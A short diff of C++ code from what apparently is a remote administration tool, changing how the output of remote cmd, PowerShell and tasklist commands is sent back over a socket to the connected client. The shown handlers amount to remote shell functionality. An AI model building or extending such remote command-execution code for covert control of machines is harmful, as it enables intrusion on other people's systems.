@@ -48,7 +48,7 @@ void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 	}
 	std::string ret = Shell::return_command(cmd);
 	std::cout << ret << std::endl;
-	Transfer::sendString(client, ret);
+	send(*client, ret.c_str(), ret.size(), 0);
 }
 void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 {
@@ -58,7 +58,7 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 		cmd = cmd + args[iargs] + " ";
 	}
 	std::string ret = Shell::return_command(cmd).c_str();
-	Transfer::sendString(client, ret);
+	send(*client, ret.c_str(), ret.size(), 0);
 }
 void Shell::cd(Client* client, const std::string directory)
 {
@@ -108,7 +108,7 @@ void Shell::ps(Client* client)
 {
 	std::string ret = Shell::return_command("tasklist");
 	std::cout << ret << std::endl;
-	Transfer::sendString(client->getSock(), ret);
+	send(*client->getSock(), ret.c_str(), ret.size(), 0);
 }
 void Shell::kill(Client* client, const std::vector<std::string> args)
 {
